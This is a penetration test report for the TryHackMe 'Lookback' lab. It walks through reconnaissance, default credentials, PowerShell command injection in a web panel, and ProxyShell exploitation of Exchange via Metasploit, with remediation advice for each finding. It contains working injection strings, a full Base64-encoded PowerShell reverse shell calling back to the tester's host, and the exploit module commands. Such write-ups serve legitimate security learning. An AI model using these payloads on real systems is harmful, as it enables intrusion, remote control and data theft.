# Penetration Test Report  
**Engagement:** TryHackMe - Lookback  
**Date:** September 2025  
**Tester:** Colin S  

---

## Summary 
A penetration test was conducted against the TryHackMe Lookback environment to assess its security posture. The assessment identified several critical weaknesses, including default credentials, insecure web application functionality, and vulnerable Microsoft Exchange Server. These weaknesses enabled full compromise of the system, including administrator-level access and extraction of sensitive files.  

Immediate recommendations are to close unnecessary services, remove or rotate default credentials, disable or restrict web panel access, patch Exchange immediately, rotate all privileged credentials, and perform host integrity checks.  
 
## Vulnerabilities  

### 1. Open Ports Detected  
**CVSS v4.0 Base Score:** 6.9 (Medium)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N  

**Summary:** Multiple open ports were discovered which enabled service, domain and server identification. This provides attackers with detailed information to map the organisation’s infrastructure and identify potentially exploitable services.  

**Background:** Open ports allowing service, domain and server identification aided in footprinting the organisation’s services including the Outlook Web Application login portal along with the login page for the internal command panel. Service identification may also enable attackers to perform further targeted reconnaissance to gain further information about a service and possible vulnerabilities present.  

**Technical details & Evidence:**  Scanning of open ports was performed with nmap via the following command:  
```bash
sudo nmap -PS -sn 10.201.67.125
sudo nmap -sS 10.201.67.125
sudo nmap -sS -sV -sC 10.201.67.125 -p 80,443,3389
```  
![Recon - nmap PS.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Recon%20-%20nmap%20PS.png)  
![Recon - nmap small.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Recon%20-%20nmap%20small.png)  
Identified open ports:  
80/tcp – open – HTTP  
443/tcp - open - HTTPS  
3389/tcp - open - RDP  

![Recon - nmap big.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Recon%20-%20nmap%20big.png)  
On the conclusion of nmap scanning a server was discovered at ```WIN-12OUO7A66M7.thm.local```  

This information allowed manual navigation to ```http://WIN-12OUO7A66M7.thm.local``` and ```https://WIN-12OUO7A66M7.thm.local``` revealing the Outlook Web Application login portal.  

Directory enumeration was undertaken against ```https://WIN-12OUO7A66M7.thm.local``` using ffuf.  
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u https://WIN-12OUO7A66M7.thm.local/FUZZ -fw 1
```
![Recon - ffuf.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Recon%20-%20ffuf.png)  
![Recon - ffuf result.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Recon%20-%20fuff%20result.png)  

This led to the discovery of an additional login panel at ```https://WIN-12OUO7A66M7.thm.local/test```  

![Flag 1 - login.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Flag%201%20-%20login.png)  

**Impact:** If left unaddressed, the ability for attackers to identify open ports, services and details about internal infrastructure in use could enable detailed network footprinting. If a system is found to be vulnerable this could allow further access to the company’s network which may lead to data extraction, reputational damage and potential legal implications for failing to safeguard data.  

**Remediation Advice:** It is advised that any ports not required for business operations be closed and unused services be disabled or uninstalled. Update firewall rule ACLs to ensure only authorised IPs can connect to services, to reduce attack surface. It is also recommended that regular port scanning is conducted, and service reviews performed to ensure no ports are accidentally left open to the internet.  

---

### 2. Discovered Default Credentials
**CVSS v4.0 Base Score:**  8.8 (High)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N  

**Summary:** Scanning on the login panel hosted at ```https://WIN-12OUO7A66M7.thm.local/test``` returned default login credentials. The use of default credentials is considered a poor security practice and is a known vulnerability, classified as CWE-1392. Attackers frequently exploit this weakness through automated scanning.  

**Background:** When the internal login panel was scanned for vulnerabilities it was discovered that this panel used default login credentials for one of the user accounts. This use of default credentials is classified as CWE-1392, representing a major security concern. Attackers can with little effort utilise scanning techniques to discover default credentials in devices or web applications allowing attackers to gain an initial foothold into a target network without being easily detected. Automated exploitation of default credentials has historically been a vector in major security incidents, like the Carna Botnet. 

**Technical details & Evidence:** Nikto was used to perform vulnerability scanning of the target ```https://WIN-12OUO7A66M7.thm.local```
```bash
nikto -h https://WIN-12OUO7A66M7.thm.local
```
![Recon - Nikto.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Recon%20-%20Nikto.png)  
Default credentials found.  

**Impact:** Default credentials enable attackers to gain access to internal services with minimal effort. This allows attackers to gain an initial foothold as a legitimate system user and work on escalating their attack further to gain higher system privileges or exfiltrate data. If attackers exploit default credentials, they can gain initial access, escalate privileges, and exfiltrate data, potentially causing significant reputational damage and operational impact. 

**Remediation Advice:** It is recommended to immediately rotate or remove default accounts and credentials, enforce strong password policies and multi-factor authentication for administrative interfaces, harden login endpoints with account lockout and rate limiting, and validate asset configurations to ensure no default credentials remain.  

---

### 3. Command Injection via Web Portal
**CVSS v4.0 Base Score:** 8.7 (High)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N  

**Summary:** The authenticated web portal provided a command panel that allowed command injection. This allowed execution of arbitrary PowerShell commands, enabling file enumeration and system interaction.   

**Background:** The authenticated web portal ```https://WIN-12OUO7A66M7.thm.local/test``` executed user-supplied commands inside a PowerShell ```Get-Content('...')``` wrapper without adequate input sanitisation. Upon entering an invalid command, the system returned an error showing the executed code, allowing detailed analysis of command handling. It was possible to terminate this and chain further commands together to execute arbitrary code on the target system. Inadequate input validation and sanitisation allow attackers to perform malicious actions on the target system without detection. This can enable attackers to enumerate file systems, exfiltrate data, and establish backdoor access for future use.    

**Technical details & Evidence:** The web portal was accessed via ```https://WIN-12OUO7A66M7.thm.local/test``` and login was granted using discovered default credentials.  

File system enumeration was performed using the following commands:  
```powershell
BitLockerActiveMonitoringLogs'); whoami; #
```  
![Flag 1 - whoami.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Flag%201%20-%20whoami.png)  

```powershell
BitLockerActiveMonitoringLogs'); dir c:\users; #
```  
![Flag2 - users.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Flag2%20-%20users.png)  

```powershell
BitLockerActiveMonitoringLogs'); dir c:\users\dev\Desktop; #
```  
![Flag2 - files.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Flag2%20-%20files.png)  

```powershell
BitLockerActiveMonitoringLogs'); type c:\users\dev\Desktop\TODO.txt; #
BitLockerActiveMonitoringLogs'); type c:\users\dev\Desktop\user.txt; #
```  
![Flag2 - flag.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Flag2%20-%20flag.png)  
![Flag2 - Todo.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Flag2%20-%20Todo.png)  

Further it was discovered that this panel could be used to inject a Base64 encoded reverse shell payload.
```powershell
BitLockerActiveMonitoringLogs'); powershell -e  JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANAAuADEAMgAuADkANwAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=; #
```
![Extra Netcat.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Extra%20Netcat.png)

**Impact:** Successful command injection allows attackers to execute arbitrary PowerShell commands on the host as an authenticated user. This enables enumeration of the file system, access to sensitive files, and retrieval of confidential information such as user credentials and internal documentation. Attackers can also inject reverse shell payloads, potentially leading to full system compromise, privilege escalation to SYSTEM, lateral movement within the network, and establishment of persistent access. In a production environment, this could result in unauthorised access to sensitive business data, compromise of domain controllers, exposure of internal communications, and severe operational and reputational damage.  


**Remediation Advice:** It is recommended to immediately disable or restrict the /test command panel to trusted management networks, re-implement functionality only with safe operations using allowlists, run web application processes under least-privilege accounts, implement robust server-side input validation and output encoding.

---

### 4. Microsoft Exchange Server vulnerable to ProxyShell RCE
**CVSS v4.0 Base Score:** 9.3 (Critical)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N  

**Summary:** It was discovered that the Microsoft Exchange version in use was subject to multiple critical vulnerabilities which enabled full system exploitation.  

**Background:** When logging into the Outlook Web Application with a user account without a mailbox the provided error included detailed version information. Upon research it was discovered that this version was vulnerable to the three separate CVEs (CVE-2021-31207, CVE-2021-34523, CVE-2021-34473) which, when chained together, allows full remote code execution access as the ```NT AUTHORITY\SYSTEM``` user. 


**Technical details & Evidence:** Initial login was attempted to the Outlook portal here: ```https://WIN-12OUO7A66M7.thm.local``` via default credentials. The returned error message provided details on the Microsoft Exchange version
```
"A mailbox couldn't be found for THM\admin."
This also returned some version information
X-ClientId: F971CA54BC9F45678DE5353728A8E7E2
request-id 556840fd-b354-4345-91b6-3fdaaddcb76c
X-OWA-Error Microsoft.Exchange.Data.Storage.UserHasNoMailboxException
X-OWA-Version 15.2.858.2
X-FEServer WIN-12OUO7A66M7
X-BEServer WIN-12OUO7A66M7
Date:9/15/2025 11:17:09 AM
```

Metasploit was then used to gain full system access to the server as detailed below.
```console
msfconsole
use exploit/windows/http/exchange_proxyshell_rce
show options
set RHOST win-12ouo7a66m7.thm.local
set Email joe@thm.local
set LHOST 10.4.12.97
run
```
![Flag3 - msf options.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Flag3%20-%20msf%20options.png)  
![Flag3 - msf error.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Flag3%20-%20msf%20error.png)
Initially the exploit failed due to the first found email account not actually being present. As such another email account was used.   
```console
set Email dev-infrastracture-team@thm.local
```  
![Flag3 - msf success.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Flag3%20-%20msf%20success.png)  

Once access was gained to the target system sensitive files could be read and extracted as below.  

```console
ls c:\\users\\Administrator\\Documents
cat c:\\users\\Administrator\\Documents\\flag.txt
```
![Flag3 - flag.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Lookback/Images/Flag3%20-%20flag.png)

**Impact:** Exploitation results in full control of the Exchange host at SYSTEM level. Consequences include mailbox access or modification, creation of persistence mechanisms, domain escalation, and large-scale data theft. Attackers could also conduct disruptive or deceptive email campaigns, potentially impacting organisational operations and reputation.  

**Remediation Advice:** It is recommended to patch Exchange immediately with all vendor-recommended updates, restrict public access to OWA/ECP and administrative endpoints via network ACLs, VPNs, or reverse-proxy/WAF, harden Exchange following Microsoft guidance including least-privilege and feature reduction, rotate all administrative credentials and inspect mailboxes for suspicious activity, scan for web shells and other indicators of compromise.  

---
## Appendices  

[CWE-1392](https://cwe.mitre.org/data/definitions/1392.html)  
[Carna Botnet](https://en.wikipedia.org/wiki/Carna_botnet)  
[CVE-2021-31207](https://www.cve.org/CVERecord?id=CVE-2021-31207)  
[CVE-2021-34523](https://www.cve.org/CVERecord?id=CVE-2021-34523)  
[CVE-2021-34473](https://www.cve.org/CVERecord?id=CVE-2021-34473)  
[exchange_proxyshell_rce detail](https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxyshell_rce/)  
